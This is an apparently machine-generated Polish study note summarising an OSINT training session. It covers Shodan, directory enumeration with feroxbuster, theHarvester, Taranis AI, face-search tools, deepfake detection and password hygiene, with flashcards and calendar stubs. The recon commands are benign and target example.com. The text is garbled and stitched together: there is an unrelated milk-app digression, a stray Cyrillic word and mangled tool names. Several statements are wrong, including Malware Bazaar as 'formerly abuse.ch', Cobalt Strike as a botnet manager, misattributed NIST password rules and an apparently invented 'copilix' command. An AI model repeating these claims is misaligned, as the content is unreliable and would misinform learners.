---
title: Drive_0824_Narzędziownik OSINT 20 Reloaded - sesja 3_transkrypcja
created: "2026-01-16 10:08"
summary: Notatka zawiera przegląd technik rekonesansu, narzędzi AI w OSINT oraz aspektów bezpieczeństwa związanych z weryfikacją danych i przestrzeganiem regulacji dotyczących ochrony danych.
type: refined
tags:
  - osint
  - cybersec
  - ai-tools
  - security-compliance
  - data-protection
  - do-weryfikacji
suggested_category: Review
status: do-weryfikacji
---

# Drive_0824_Narzędziownik OSINT 20 Reloaded - sesja 3_transkrypcja

> [!abstract] Podsumowanie
> Notatka zawiera przegląd technik rekonesansu, narzędzi AI w OSINT oraz aspektów bezpieczeństwa związanych z weryfikacją danych i przestrzeganiem regulacji dotyczących ochrony danych.

## 📝 Treść

---
title: Drive_0824_Narzędziownik OSINT 20 Reloaded - sesja 3_transkrypcja
created: "2026-01-16 09:44"
summary: W trakcie trzecich zajęć z serii dotyczącej OSINT uczestnicy poznają techniki rekonesansu, narzędzia AI oraz bezpieczeństwo w internecie, w tym wprowadzenie do dark webu.
type: transcript
tags:
  - calendar
  - compliance
  - compliance/dora
  - compliance/nis2
  - compliance/rodo
  - cybersec
  - cybersec/blue-team
  - cybersec/osint
  - productivity
  - tech
  - tech/python
  - todo
  - source/drive_import
status: do-weryfikacji
source_file: Drive_0824_Narzędziownik OSINT 2.0 Reloaded - sesja 3_transkrypcja.txt
---

# Drive_0824_Narzędziownik OSINT 20 Reloaded - sesja 3_transkrypcja

> [!abstract] Podsumowanie
> W trakcie trzecich zajęć z serii dotyczącej OSINT uczestnicy poznają techniki rekonesansu, narzędzia AI oraz bezpieczeństwo w internecie, w tym wprowadzenie do dark webu.

## 📝 Treść

## Narzędziownik OSINT - Zajęcia 3

### Wprowadzenie
Spotkanie prowadzi Tomasz Turba. W trakcie zajęć omawiane będą zagadnienia techniczne dotyczące:
- Rekonesansu technicznego
- Narzędzi AI
- Demaskowania botów AI
- Zagadnienia związane z bezpieczeństwem własnym
- Wprowadzenie do dark webu

### Prezentacja
Prezentacja do zajęć dostępna jest pod adresem: [link do prezentacji](#).

### Informacje o Securitum
Securitum to organizacja zajmująca się:
- Szkoleniami
- Pentestowaniem
- Organizacją konferencji
- Publikowaniem książek

### Nadchodzące Wydarzenia
- **TERMIN:** 20 października - konferencja Mega Secura Cracking Party w Krakowie.
- Możliwość zakupu biletów online z rabatem do 50%.

## Shodan.io
Shodan to wyszukiwarka dla urządzeń podłączonych do internetu, używana do:
- Wyszukiwania podatności w infrastrukturze IT
- Odkrywania urządzeń klasy OT oraz baz danych

### Wyszukiwanie w Shodan
Dostęp do systemu można uzyskać poprzez:
- Zalogowanie się na konto (z dostępem za opłatą)
- Użycie API do monitorowania podatności

### Scenariusze Bezpieczeństwa
Zaufane urządzenia mogą być narażone na ataki. Możliwość eksploracji podatnych urządzeń, takich jak:
- Drukarki
- Routery

#### Przykład Wyszukiwania
Wyszukiwanie przykładowych urządzeń w różnych krajach oraz analiza wystawionych systemów operacyjnych, na przykład:
- Windows 7

## Bezpieczeństwo Infrastruktury
Wzmożona czujność w zakresie bezpieczeństwa, aby unikać przypadkowego dostępu do niebezpiecznych lokalizacji.

### Honeypot
Honeypot to pułapka dla hakerów, aby zarejestrować ich działania. Taki system pozwala na:
- Zbieranie danych o atakach
- Analizę metod stosowanych przez napastników

## 📅 Calendar
- **TERMIN:** 20 października - Mega Secura Cracking Party [Synced](https://www.google.com/calendar/event?eid=bzhlZ2QxZ2U4MXFhN3Zudm00aWY1dW1wYWsgbWFyY2luLnVib2dpQG0)

## 📝 Actions
TODO: Przygotować się do omawiania narzędzi AI na następnych zajęciach.  
TODO: Zbadać dostępność i funkcjonalność biletów na konferencję.  

## 🧠 Flashcards
#flashcard Co to jest Shodan? :: Wyszukiwarka dla urządzeń podłączonych do internetu.  
#flashcard Jaki jest termin konferencji Mega Secura Cracking Party? :: 20 października.  
#flashcard Czym jest honeypot? :: Pułapka dla hakerów do analizy ich działań.  

## 📅 Calendar
TERMIN: 19:24 - 34:19: Omówienie wykorzystania narzędzi do identyfikacji infrastruktury w internecie. [Synced](https://www.google.com/calendar/event?eid=Zzc5ZnI4ZjI1YXJna2lobGU2MWlwaGpsMWMgbWFyY2luLnVib2dpQG0)

## ## Analiza infrastruktury i bezpieczeństwa
### Identyfikacja w internecie
Identifikacja infrastruktury w publicznym internecie staje się coraz bardziej dostępna. Poprzez różne narzędzia, takie jak Shodan, można zlokalizować urządzenia i usługi w "clear necie", a także potencjalnie znaleźć infrastrukturę przestępczą.

### Wykorzystanie narzędzi
Wspomniane narzędzia to:
- **Cobalt Strike**: popularne wśród cyberprzestępców do zarządzania botnetami.
- **Shodan**: umożliwia wyszukiwanie publicznie dostępnych kamer, serwerów i innych urządzeń.
- **Censys**: oferuje zaawansowane wyszukiwanie poprzez protokoły.
- **ZoomEye**: chińska wyszukiwarka podobna do Shodana, choć mniej etyczna.
- **URL Scan i Criminal IP**: narzędzia używane do pasywnego OSINT i analizy reputacji adresów IP.

### Przykłady działania
Możliwe jest zidentyfikowanie:
- Dostępu do serwerów, które mogą być wykorzystywane przez zorganizowaną przestępczość.
- Publicznych kamer, które mogą być eksploatowane, co pokazano na przykładzie kamery w Louisville.
- Względów bezpieczeństwa kamer IP, takich jak Hikvision, które mają znane luki.

## Zagadnienia związane z DORA, NIS2, RODO
Każde z narzędzi i technik opisanego OSINT niesie ryzyko związane z ochroną danych oraz przestrzeganiem regulacji takich jak RODO. Użycie danych osobowych czy urządzeń, które mogą być częścią infrastruktury krytycznej, podlega rygorystycznym regulacjom.

## 📝 Actions
TODO: Zbadać dostępność narzędzi do identyfikacji infrastruktury w internecie i ocenić ich bezpieczeństwo.
TODO: Przeanalizować luki w zabezpieczeniach kamer IP i ich wpływ na bezpieczeństwo danych.
TODO: Sprawdzić, jak narzędzia OSINT są zgodne z regulacjami DORA, NIS2 i RODO.

## 🧠 Flashcards
#flashcard Jakie narzędzie jest używane do zarządzania botnetami? :: Cobalt Strike
#flashcard Jaka chińska wyszukiwarka podobna do Shodana oferuje mniej etyczne podejście? :: ZoomEye
#flashcard Jakie luki w zabezpieczeniach są znane w kamerach Hikvision? :: Lukę krytyczną w oprogramowaniu nieaktualizowanym od 2017 roku

## Narzędzia OSINT do Wykrywania Wrażliwych Danych na Serwerach

Wykorzystanie narzędzi OSINT (Open Source Intelligence) do identyfikacji potencjalnie wrażliwych danych na serwerach jest kluczowe w działaniach związanych z audytami bezpieczeństwa i testami penetracyjnymi.

### Ferox Buster
Ferox Buster to narzędzie do enumeracji katalogów oraz plików w obrębie serwera. Może być używane do identyfikacji wrażliwych plików, które mogą być dostępne publicznie.

#### Użycie Ferox Buster
1. Zalogować się na serwer.
2. Wskazać adres URL do skanowania.
3. Użyć odpowiedniego słownika, który zawiera listę folderów i plików.

Przykład polecenia uruchamiającego narzędzie:
```bash
feroxbuster -u http://example.com -w /path/to/wordlist.txt
```

### The Harvester
The Harvester to narzędzie do wyszukiwania subdomen i adresów e-mail powiązanych z określoną domeną. Choć jest to starsze narzędzie, nadal ma zastosowanie w procesach zbierania informacji.

#### Użycie The Harvester
1. Można go uruchomić na lokalnej maszynie lub w maszynie wirtualnej.
2. Używać poleceń wysyłających zapytania do wyszukiwarek, celem przechwytywania danych powiązanych z subdomenami i adresami e-mail.

Przykład polecenia:
```bash
theharvester -d example.com -b google
```

## Bezpieczeństwo Wystawionych Systemów
Wystawianie urządzeń, takich jak drukarki, do publicznego dostępu niesie ze sobą poważne zagrożenia. Atakujący mogą wykorzystać podatności do nieautoryzowanego dostępu do infrastruktury.

### Potencjalne Ryzyka
- Ujawnione dane, takie jak adresy e-mail i dane uwierzytelniające.
- Możliwość aktualizacji oprogramowania układowego (firmware) przez nieautoryzowane podmioty.

### Przykłady
- Drukarka wystawiona w Internecie może mieć ujawnione informacje, takie jak MAC adres, godzina uruchomienia i inne, które mogą być wykorzystane przez przestępców.

## Regulatory Compliance
Zastosowanie narzędzi do skanowania i enumeracji wymagane jest zgodnie z regulacjami DORA (Digital Operational Resilience Act) oraz NIS2 (Network and Information Systems Directive), które nakładają na organizacje obowiązek zabezpieczenia swoich systemów przed cyberzagrożeniami.

## 📝 Actions
TODO: Zainstalować Ferox Buster i The Harvester na środowisku testowym.  
TODO: Przeprowadzić testy penetracyjne na lokalnych systemach z wykorzystaniem Ferox Buster.  
TODO: Opracować plan aktualizacji dla narzędzi OSINT, by zapewnić ich wydajność oraz bezpieczeństwo.

## 📅 Calendar
SPOTKANIE: Omówienie wyników testów penetracyjnych oraz działania korygujące - 2023-11-15.   [Synced](https://www.google.com/calendar/event?eid=bjZjNzc3Nm9rcThnZGhiMWxqdHBlYWRjMmsgbWFyY2luLnVib2dpQG0)

## 🧠 Flashcards
#flashcard Co to jest Ferox Buster? :: Narzędzie do enumeracji katalogów i plików na serwerze.  
#flashcard Jakie dane może zebrać The Harvester? :: Subdomeny i adresy e-mail powiązane z daną domeną.  
#flashcard Jakie są konsekwencje wystawienia drukarek w Internecie? :: Ujawnienie wrażliwych danych i możliwości nieautoryzowanego dostępu.

## Analiza bezpieczeństwa urządzeń

### Wprowadzenie do zagrożeń
Urządzenia mogą być narażone na ataki, jeśli odpowiednie pliki są zindeksowane. Przykłady złośliwego oprogramowania wysyłają pliki, które mogą spowodować, że urządzenie stanie się podatne na ataki, co przestępcy mogą wykorzystać do dalszych działań w sieci.

### Testy penetracyjne
Wykrywanie ataków i niebezpieczeństw związanych z urządzeniami, takimi jak drukarki, jest kluczowe. Częste zaniedbania konfiguracyjne mogą prowadzić do wystawienia tych urządzeń na ataki, co można zaobserwować w narzędziach takich jak Shodan.

### Narzędzia OSINT
Z perspektywy operacyjnej warto korzystać z narzędzi analitycznych, takich jak:
- **Encyklopedia Malware'u**
- **Packet Total** – odpowiednik Virus Total dla pakietów.
- **Malware Bazaar** (dawniej abuse.ch) – źródło informacji o złośliwym oprogramowaniu.
- **Malpedia** – bazy danych o ransomware.

### Użycie Virus Total
Virus Total to popularne narzędzie, które umożliwia analizę plików pod kątem złośliwości. Należy zwrócić uwagę na kwestie prywatności, szczególnie w przypadku plików z danymi osobowymi. Nie należy wysyłać takich plików do analizy.

### Bezpieczeństwo danych
Użytkownikom zaleca się unikanie ładowania plików, które mogą zawierać dane osobowe. Zamiast tego, można wprowadzać adresy URL do analizy. Przy niektórych wynikach, strona złośliwa jest oznaczona na czerwono, a bezpieczna na zielono.

### Platformy analityczne
Należy korzystać z platform takich jak eny.run, które pozwalają na uruchomienie złośliwego oprogramowania w kontrolowanym środowisku. Umożliwia to obserwację działania złośliwego oprogramowania w bezpieczny sposób.

### Zasady inżynierii odwrotnej
Inżynieria odwrotna złośliwego oprogramowania powinna być prowadzona na maszynach wirtualnych, aby zminimalizować ryzyko infekcji. Narzędzia, takie jak GIDRA, są użyteczne do analizy struktury plików.

## 📝 Actions
TODO: Przeanalizować ryzyko związanego z wykorzystaniem złośliwego oprogramowania na urządzeniach w biurze.  
TODO: Oświadczyć pracowników o zagrożeniach związanych z ładowaniem plików do Virus Total.  
TODO: Ustalić plan działania na wypadek wykrycia złośliwego oprogramowania w organizacji.

## 📅 Calendar
TERMIN: 10.10 - Szkolenie dotyczące Cyber Threat Intelligence.   [Synced](https://www.google.com/calendar/event?eid=Y3A1bWRpcTdwYmU1ZDh0YTZxY2NubXIyczAgbWFyY2luLnVib2dpQG0)
TERMIN: 30.10 - Sprawdzenie aktualnych zasad bezpieczeństwa organizacji.   [Synced](https://www.google.com/calendar/event?eid=OTFqdjg3Y2JxdDBiaWp2bTZmdm44ZDhpbDAgbWFyY2luLnVib2dpQG0)

## 🧠 Flashcards
#flashcard Jakie jest zagrożenie związane z ładowaniem plików do Virus Total? :: Możliwość ujawnienia danych osobowych.  
#flashcard Co to jest Malware Bazaar? :: Źródło informacji o złośliwym oprogramowaniu.  
#flashcard Jakie jest główne zastosowanie narzędzi OSINT? :: Zbieranie informacji w celu oceny zagrożeń.

## 📅 Calendar
TERMIN: Mega Securac Hacking Party - 7 dni od teraz [Synced](https://www.google.com/calendar/event?eid=MjI5NjdpMDk2NGkxNWM0M2lrZzhhZDgwaGMgbWFyY2luLnVib2dpQG0)

## 🔍 OSINT i Sztuczna Inteligencja
### Wykorzystanie AI w OSINT
Sztuczna inteligencja (AI) może być skutecznie wykorzystana w OSINT (Open Source Intelligence). Narzędzia OSINT poprawiają przyspieszenie analiz i umożliwiają zbieranie danych. Warto zwrócić uwagę, że choć AI przynosi wiele korzyści, nadal może generować niepotrzebny "śmietnik" danych.

### Problemy w Dostępie do Naturalnych Źródeł
Narzędzie Food Farmer umożliwia lokalnym dostawcom sprzedaż naturalnych produktów, takich jak mleko. Mimo że aplikacja jest innowacyjna, istnieją ograniczenia w dotarciu do gospodarstw, które funkcjonują bez technologii.

## ⚠️ Aspekty Bezpieczeństwa
Z perspektywy RODO, przy gromadzeniu informacji o osobach prawdziwych (np. mleko od lokalnych dostawców) należy przestrzegać przepisów dotyczących ochrony danych osobowych. Nieautoryzowane przetwarzanie danych może prowadzić do naruszeń.

### Proces Tworzenia Profilu OSINT
1. Generowanie profili do OSINT można zrealizować poprzez korzystanie z narzędzi, takich jak fake person generator, które wytwarzają zdjęcia osób na podstawie prawdziwych obrazów.
2. Należy jednak analizować metadane tych obrazów, ponieważ mogą zawierać informacje wskazujące na ich źródło.

## 📝 Actions
TODO: Rozważyć zastosowanie narzędzi AI do analizy danych w OSINT.  
TODO: Sprawdzić zgodność ze standardami RODO podczas zbierania danych.  
TODO: Zidentyfikować lokalnych dostawców produktów naturalnych korzystających z aplikacji Food Farmer.  
TODO: Analizować metadane zdjęć generowanych przez fake person generator.

## Dokumentacja Techniczna dotycząca wykorzystania narzędzi do generacji i weryfikacji AI

### 1. Wprowadzenie
Niniejsza dokumentacja opisuje proces generacji danych osobowych oraz weryfikacji tekstów przy użyciu narzędzi AI. Zawiera również uwagi dotyczące bezpieczeństwa danych oraz efektywności w kontekście sztucznej inteligencji.

### 2. Generacja danych osobowych
W przypadku generowania wizerunku danej osoby, kluczowe jest uwzględnienie podstawowych parametrów, takich jak wiek, stan oraz lokalizacja. Proces ten jest przydatny w kontekście analizy społecznej lub wywiadowczej.

#### Przykład
Aby wygenerować wizerunek osoby, można zastosować następujące parametry:
- Wiek: 30 lat
- Stan: Teksas

### 3. Weryfikacja фактов
Weryfikacja informacji w internecie stała się kluczowa. Odpowiedzi udzielane przez wyszukiwarki są często podatne na manipulacje algorytmów SEO, co skutkuje otrzymywaniem wyników mniej wiarygodnych.

#### Problemy związane z weryfikacją
- Wyszukiwanie może zwracać jedynie najlepiej wypozycjonowane treści.
- Narzędzia weryfikacyjne, takie jak **Copilix**, mogą ocenić jakość tekstów oraz wykrywać plagiaty.

#### Przykład użycia narzędzia:
```bash
copilix --scan <tekst_do_weryfikacji>
```

### 4. Problematyka bezpieczeństwa
Zgodność z przepisami takimi jak RODO jest niezbędna w kontekście przetwarzania danych osobowych. Wymaga to:
- Zgody osób, których dane są przetwarzane.
- Zapewnienia odpowiednich środków ochrony danych.

### 5. Techniki weryfikacji
Różnorodność narzędzi do weryfikacji danych zwiększa szansę na uzyskanie rzetelnych informacji. Należy rozważyć takie rozwiązania jak:
- **Aitor** – narzędzie do pisania tekstów.
- **Site** – weryfikator fact-checking.

### 6. Usprawnienia i zastosowania
Aktualne narzędzia AI oferują funkcjonalności, które pozwalają na przetwarzanie i analizę danych z wielu źródeł, w tym publikacji naukowych.

#### Przykład wydajnego przetwarzania zapytań:
```python
def query_data(query):
    # Funkcja przeszukująca dane z publikacji
    results = search_publikacje(query)
    return results
```

## 📝 Actions
TODO: Sprawdzić efektywność generacji wizerunku w kontekście lokalizacji.
TODO: Zidentyfikować możliwe luki w danych wymagające weryfikacji.
TODO: Zastosować narzędzie Copilix do oceny jakości wygenerowanych tekstów.

## 📅 Calendar
SPOTKANIE: Przegląd narzędzi do weryfikacji danych - 2023-12-01 [Synced](https://www.google.com/calendar/event?eid=cDRjdXQwaDIxZzA0NzJrc3A1cDN2c2JocjQgbWFyY2luLnVib2dpQG0)

## 🧠 Flashcards
#flashcard Jakie są kluczowe parametry przy generacji danych osobowych? :: Wiek, stan, lokalizacja.
#flashcard Co to jest Copilix? :: Narzędzie do wykrywania plagiatów i oceny jakości tekstów.

## 📝 Actions
TODO: Przeanalizować wpływ AI na społeczeństwo podczas generowania treści.  
TODO: Zbadać potencjalne źródła wykorzystania AI w kontekście deepfake'ów.  
TODO: Opracować zarys odpowiednich przepisów w kontekście RODO i etyki AI.  

## 📅 Calendar
SPOTKANIE: Omówienie generatywnej AI oraz jej zastosowań - 2023-12-01.   [Synced](https://www.google.com/calendar/event?eid=MzBjMnViN2czNHQ2cWY2bzIwOWJ0bmRlaG8gbWFyY2luLnVib2dpQG0)

## 🎨 Generatywna AI i Deepfake
Sztuczna inteligencja (AI) zmienia sposób, w jaki tworzone są treści:  
- Przykłady wykorzystania AI w przypominaniu o fizycznych osobach, jak Steven Hawking.  
- Deepfake jako rosnący problem w społeczeństwa.  
- Uzyskiwanie modeli AI, takich jak Sora 2, dla generacji treści i jutubowych wizji fenomenu.  

## 📚 Potencjalne Źródła Informacji
- **Govowa**: Ważne źródło informacji w kontekście przepisów i regulacji.  
- **Science.org**: Artykuły naukowe z całym DOI jako wsparcie badawcze.  

## 💻 Praca z Modelem AI
Przykład modelu do generacji treści:  
```python
def generate_image(prompt):
    # Funkcja do generacji obrazu na podstawie prompta
    pass
```
Wytyczne do użycia portalu [replicate.com](https://replicate.com) dla generowania treści.  

## ⚠️ Etyka i Legalność
- Zróżnicowanie profili AI: etyczne vs. nieetyczne.  
- Możliwość namierzania AI generowanych profili w profesjonalnych sieciach, takich jak LinkedIn.  

## 📈 Wyniki i Wnioski
- Zachowanie zgodności z przepisami (np. DORA, NIS2, RODO).  
- Wzrost wykorzystania narzędzi osintowych do monitorowania AI.  
- Zwrócenie uwagi na komunikaty wynikające z modelowania AI, co może stanowić punkt do analizy i wykrywania anomalii.

## 🧠 Flashcards
#flashcard Co to jest deepfake? :: Technologia sztucznej inteligencji umożliwiająca zmianę obrazu lub dźwięku, symulując prawdziwe zachowania osób.  
#flashcard Jakie są zagrożenia wynikające z użycia AI w generacji treści? :: Możliwość dezinformacji, naruszeń prywatności, etyki oraz stosowanie nielegalnych praktyk.  
#flashcard Jakie przepisy regulują stosowanie AI? :: DORA, NIS2 i RODO regulują aspekty bezpieczeństwa, danych osobowych oraz przepisów dotyczących technologii AI.

## Narzędzia OSINT wspierane przez AI

### Wprowadzenie
W kontekście analizy informacji, istotne jest wykorzystanie odpowiednich narzędzi, które wspierają proces zbierania danych. W tym zakresie wyróżniają się narzędzia OSINT, które korzystają z technologii AI.

### Hunter
Narzędzie Hunter umożliwia pozyskiwanie informacji o firmach, a nie tylko o pojedynczych adresach e-mail. Po wprowadzeniu nazwy firmy, użytkownik otrzymuje wyniki dotyczące różnych domen związanych z tą firmą, a także konkretne informacje o e-mailach i innych danych.

### Silect.io
Silect.io jest narzędziem, które łączy ze sobą różne źródła danych i pozwala na analizę wyników poprzez wykorzystanie modeli AI. Narzędzie to dostarcza różnorodnych informacji, takich jak:
- domeny
- ludzi
- zdjęcia
- pliki
- adresy IP
- e-maile
- numery telefonów

### Taranis
Taranis jest narzędziem analityki OSINT, które służy do zbierania danych z różnych portali. Rozwijał go zespół SKCERT jako projekt wspierany przez Unię Europejską. Taranis NG oraz jego rozszerzenie Taranis AI są dostępne na GitHubie, co pozwala na rozpoczęcie pracy nad analizą danych w środowisku Linux.

### Instrukcje wdrożeniowe
Aby uruchomić Taranis AI, należy korzystać z kontenerów. W dokumentacji na GitHubie dostępne są przykład komendy do wdrożenia narzędzia.

```bash
docker run -d -p 8080:8080 taranis:latest
```

### Dashboard
Po uruchomieniu Taranis, dostępny jest dashboard, który umożliwia zarządzanie źródłami działań OSINT-owych. Użytkownik może zaimportować plik JSON z polskimi portalami cyberbezpieczeństwa oraz pobrać dane do analizy.

### Analiza danych
Dashboard Taranis pozwala na tworzenie grup i raportów związanych z poszukiwaniem informacji o konkretnej osobie, firmie lub organizacji. Analizy te są wykorzystywane do tworzenia raportów o podatności (vulnerability reports), które mogą być udoskonalone przez AI.

## 📝 Actions
TODO: Przygotować szczegółowe instrukcje wdrożeniowe dla Taranis AI.
TODO: Zbadać i przetestować działanie narzędzi Hunter i Silect.io w kontekście OSINT.

## 📅 Calendar
SPOTKANIE: Zaplanować spotkanie dotyczące analizy wyników narzędzi OSINT z zespołem w przyszłym tygodniu. [Synced](https://www.google.com/calendar/event?eid=dW5oNWkyNDc3cGRrcmI0a2ZwZGpmb3MyMjAgbWFyY2luLnVib2dpQG0)

## 🧠 Flashcards
#flashcard Jakie narzędzie tworzy raporty o podatności? :: Taranis
#flashcard Co to jest Silect.io? :: Narzędzie łączące różnorodne źródła danych do analizy.

## Dashboard Vulnerability Management

### Nowe Asety
Zidentyfikowano 139 nowych asetów, które mogą być przetworzone w celu analizy podatności.

### Tworzenie Raportu
1. Utworzenie nowego raportu dotyczącego zidentyfikowanych podatności.
2. Zabezpieczenie materiałów przed dalszą obróbką przez AI:
   - Wydobycie danych, takich jak numery CVE i ich oznaczenia.

### Edycja Raportu
1. Możliwość dodawania tagów i wartości kluczowych do poszczególnych pozycji.
2. Możliwość dodawania komentarzy, które mogą być przydatne na etapie śledztwa.

### Zautomatyzowane Procesy
- Implementacja botów do automatyzacji analizy danych:
  - Wyszukiwanie podatności z wykorzystaniem konkretnych fraz lub promptów.
  - Analiza sentymentu oraz historia działań.

### Crontab i Automatyzacja
Boty mogą być uruchamiane zgodnie z określonym harmonogramem przy użyciu crontaba, co pozwala na regularne aktualizacje i monitorowanie podatności.

```bash
# Przykład wpisu crontab
0 * * * * /path/to/bot_command
```

### Integracja z OpenAI
Integracja z OpenAI API umożliwia wykorzystanie AI do przetwarzania danych, co zwiększa efektywność analizy podatności. Dodatkowe grupy, takie jak "Polska Cyberbezpieczeństwo", mogą zostać skonstruowane dla lepszej organizacji.

### Parametryzacja Raportu
Wybór odpowiednich parametrów w raporcie, takich jak poziom TLP (Traffic Light Protocol), który określa stopień niebezpieczeństwa i wymagane działania.

### Funkcjonalność Taranis
- Taranis pozwala na dynamiczne tworzenie raportów z wykorzystaniem sugestii AI.
- Użytkownik ma możliwość definicji szablonów do wychwytywania specyficznych informacji, np. dotyczących dezinformacji.

## 📝 Actions
TODO: Zidentyfikować i zgromadzić kolejne asetów do analizy.  
TODO: Ustalić szczegółowe parametry dla raportu oraz harmonogram aktualizacji botów.  
TODO: Opracować szablony do wychwytywania wartości kluczowych z plików PDF oraz innych zasobów.  

## 📅 Calendar
TERMIN: Przerwa do 21:15.   [Synced](https://www.google.com/calendar/event?eid=ZjFidGUxZGl1azg2M2RiZDhicnFybjdwZWcgbWFyY2luLnVib2dpQG0)
SPOTKANIE: Kolejna część analizy i omówienia raportów po przerwie.   [Synced](https://www.google.com/calendar/event?eid=am9zODE1MXRsZW02ZDNmbDJmN2RkZzdyZTggbWFyY2luLnVib2dpQG0)

## 🧠 Flashcards
#flashcard Jakie są funkcje dashboarda zarządzania podatnościami? :: Identyfikacja nowych asetów i tworzenie raportów.  
#flashcard Co to jest TLP? :: Traffic Light Protocol, określający poziom niebezpieczeństwa.  
#flashcard Jak można zautomatyzować proces analizy podatności? :: Używając botów i crontaba do regularnych aktualizacji.  

## 📄 Dokumentacja narzędzi OSINT i zabezpieczeń

### 1. Wprowadzenie
Narzędzia do przeprowadzania wywiadów i analizy danych, takie jak PimEyes i FaceCheck ID, są szeroko wykorzystywane przez różne służby. Narzędzia te umożliwiają wyszukiwanie wizerunków oraz łączenie z bazami danych przestępców.

### 2. PimEyes
PimEyes to narzędzie wykorzystujące technologię rozpoznawania twarzy, które pozwala na identyfikację osób na zdjęciach oraz wideo. Koszt jego użycia to 72 zł za dostęp do wyników wyszukiwania.

### 3. FaceCheck ID
FaceCheck ID łączy się z różnymi bazami danych, takimi jak bazy danych oszustów i przestępców. Daje dostęp do wyszukiwania zobowiązując użytkowników do zaakceptowania warunków korzystania.

### 4. GeoSpy
GeoSpy to narzędzie, które analizuje zdjęcia, próbując określić lokalizację na podstawie dostępnych danych, m.in. map. Wszystkie dane są archiwizowane, co znacznie ułatwia późniejsze przeszukiwanie.

### 5. Demaskowanie AI
Wykrywanie deepfake'ów jest możliwe dzięki narzędziom takim jak Easy AI oraz DeepWare. Uproszczone narzędzie do analizy zdjęć, nazwane Aria, zaczyna być wykorzystane do detekcji zmian w obrazach i wideo.

### 6. Zabezpieczenia i zgodność z przepisami
Użytkownicy tych narzędzi powinni być świadomi DORA, NIS2 oraz RODO, co oznacza, że dane osobowe muszą być odpowiednio chronione, a ich wykorzystanie legalne.

## 📝 Actions
TODO: Przeprowadzić szkolenie z używania narzędzi PimEyes i FaceCheck ID.
TODO: Sprawdzić zgodność procesów z wymaganiami DORA i NIS2.
TODO: Zaktualizować dokumentację na temat korzystania z GeoSpy i zabezpieczeń danych.

## 📅 Calendar
TERMIN: Ustalić datę warsztatów dotyczących narzędzi OSINT. [Synced](https://www.google.com/calendar/event?eid=dnRuNG0xOGl1ZmI3OWMzZDZhZ2ZqYWpncDggbWFyY2luLnVib2dpQG0)
SPOTKANIE: Zaplanować spotkanie dotyczące zagadnień związanych z RODO. [Synced](https://www.google.com/calendar/event?eid=ZzlqMmlvMWFicWdxbHIwbW8ycHRldGc4cDggbWFyY2luLnVib2dpQG0)

## 🧠 Flashcards
#flashcard Co to jest PimEyes? :: Narzędzie do analizy twarzy, umożliwiające identyfikację osób na zdjęciach.
#flashcard Jakie są zasady korzystania z FaceCheck ID? :: Wymaga akceptacji warunków użytkowania i zasilania baz danych.
#flashcard Co to jest GeoSpy? :: Narzędzie do określania lokalizacji na podstawie zdjęć.

## Zasady bezpieczeństwa haseł

### Wprowadzenie
Bezpieczeństwo haseł ma kluczowe znaczenie w ochronie danych. Właściwe zasady tworzenia haseł pomagają w zabezpieczeniu kont przed nieautoryzowanym dostępem.

### Minimalne wymagania dla haseł
Rekomendacja z National Institute of Standards and Technology (NIST):
- Minimum 12 znaków, zaleca się 15.
- Użycie małych i wielkich liter, cyfr oraz znaków specjalnych.

### Problematyka haseł prostych
Przykład popularnej usługi, która uznaje hasło `test123!` za bezpieczne:
- W rzeczywistości takie hasło nie spełnia wymagań bezpieczeństwa.
- Złożoność hasła jest mniej ważna niż jego długość.

### Algorytmy haszowania
- Hasła powinny być przekształcane do formy nieodwracalnej przy użyciu algorytmu haszowania.
- Dobra suma kontrolna umożliwia weryfikację poprawności.

### Menadżery haseł
Rekomendowane narzędzia:
- Kipas, Bitwarden (bezpłatne).
- OnePassword (płatne, cena: $10-$15 miesięcznie).
- Użycie menadżera haseł eliminuje potrzebę pamiętania wielu haseł.

### Uwierzytelnianie dwuczynnikowe
- Kluczowe dla bezpieczeństwa kont.
- Problematyczne może być użycie wielu kluczy, które identyfikują użytkownika w systemach.

### Incydenty bezpieczeństwa
- Utrata pendrive’a z niezaszyfrowanymi danymi to poważny incydent.
- Konieczność informowania o incydentach, szczególnie w kontekście RODO.

### Szyfrowanie danych
- BitLocker dostępny na systemach Windows pozwala na szyfrowanie danych.
- Zaszyfrować dane na nośnikach, aby uniknąć wycieku informacji.

### Manipulacje przy dokumentach
- Próba cenzurowania dokumentów może okazać się nieskuteczna.
- Użytkownicy powinni być ostrożni przy edytowaniu i przycinaniu dokumentów, aby nie wyjawić zakrytych informacji.

## 📝 Actions
TODO: Przeanalizować aktualne zasady bezpieczeństwa haseł w organizacji.  
TODO: Zastosować rekomendowane narzędzia do zarządzania hasłami.  
TODO: Zainstalować i skonfigurować dwuczynnikowe uwierzytelnianie na wszystkich kontach.  
TODO: Wdrożyć procedury informowania o incydentach bezpieczeństwa.  
TODO: Zaszyfrować wszystkie wrażliwe dane na nośnikach.  

## 🧠 Flashcards
#flashcard Jakie są minimalne wymagania dla hasła? :: Minimum 12 znaków, zaleca się 15.  
#flashcard Jakie są rekomendowane menadżery haseł? :: Kipas, Bitwarden, OnePassword.  
#flashcard Dlaczego ważne jest szyfrowanie danych? :: Zapobiega utracie informacji w przypadku zgubienia nośnika.  

## 📅 Calendar
- TERMIN: 30 października o godzinie 19:00. [Synced](https://www.google.com/calendar/event?eid=bWNncnN2MzIwcGE4NTA0YzhvNTMxbDVqa3MgbWFyY2luLnVib2dpQG0)

## 1. Bezpieczeństwo danych osobowych
Powyższy tekst przedstawia kilka istotnych kwestii dotyczących bezpieczeństwa danych osobowych, szczególnie w kontekście RODO. Oto kluczowe informacje:

### 1.1 Przechowywanie i zabezpieczanie haseł
- Stosowanie haseł do systemów informatycznych, które są widoczne (np. zapisane na kartkach) stanowi ogromne ryzyko utraty danych.
- Dwa lokalizacje haseł (do komputera i do bazy danych) zwiększają ryzyko naruszenia bezpieczeństwa.

### 1.2 Ochrona wrażliwych danych
- Ujawnienie danych osobowych, takich jak PESEL, imię i nazwisko, może prowadzić do nielegalnych działań, jak kradzież tożsamości.
- Współpracowanie z osobami posiadającymi dane wrażliwe wymaga zachowania szczególnej ostrożności.

### 1.3 Cenzurowanie danych wizualnych
- Użytkownicy powinni pamiętać o dokładnym cenzurowaniu zdjęć dokumentów, aby uniknąć ujawnienia informacji wrażliwych, które mogą być rozpoznawalne.

## 2. Dark Web i Deep Web
### 2.1 Podział internetu
- **Surface Web**: Powierzchowna część internetu dostępna za pomocą standardowych wyszukiwarek.
- **Deep Web**: Internet głęboki, gdzie dostęp do danych wymaga rejestracji lub specjalnych uprawnień, nieindeksowany przez pająki wyszukiwarek.
- **Dark Web**: Część Deep Web, której dostęp wymaga specjalnego oprogramowania (np. Tor) i często wykorzystywana jest do nielegalnych działań.
